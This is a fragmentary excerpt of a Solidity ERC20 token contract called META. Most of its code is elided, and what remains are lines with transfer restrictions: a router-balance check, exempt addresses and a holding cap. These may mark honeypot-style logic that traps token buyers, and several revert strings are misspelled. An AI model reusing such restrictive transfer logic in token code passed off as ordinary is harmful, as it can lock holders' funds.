...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(currentAllowance >= amount, "ERC20: transfer eceds allowance");
    ...
    function _transferWithBurn(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer rom  zero address");
...
contract META is ERC20 {
    ...
    constructor(address router) ERC20(unicode"Make Ethereum Thrive Again", unicode"META", TOTAL_SUPPLY) {
    ...
    function _transfer(
        ...
        if (!isException[from] && !isException[to]){
            require(balanceOf(address(uniswapV2Router)) == 0, "ERC20:  router deflation");
    ...
    function _checkLimitation(
        ...
        if (!hasLimit) {
            if (!isException[from] && !isException[to]) {
                ...
                require(balanceOf(to) + amount <= maxHolding, "Max holding  max");
            }
        }
    }
